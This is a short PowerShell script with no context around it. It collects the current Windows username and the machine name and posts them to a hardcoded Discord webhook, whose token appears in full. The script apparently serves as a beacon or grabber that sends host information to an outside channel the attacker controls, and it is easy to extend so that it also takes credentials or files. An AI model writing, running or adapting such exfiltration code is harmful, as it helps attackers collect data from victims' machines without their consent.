$webhookUrl="https://discord.com/api/webhooks/1209677596695068792/cHQyM148MEtZvYDk-d4uYxn4C6tXJ7UYLNZoH7pF4jXGnXXLtt3bvl2iJhEINCMAtOH9";
try {
    $u = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name;
    $deviceName = [System.Environment]::MachineName;
    $msg = @{
        content = "**System Information:**`n- Username: $u`n- Device Name: $deviceName"
    } | ConvertTo-Json;
    irm -Uri $webhookUrl -Method Post -Body $msg -ContentType "application/json"
} catch {
    Write-Output "Error: $_"
}
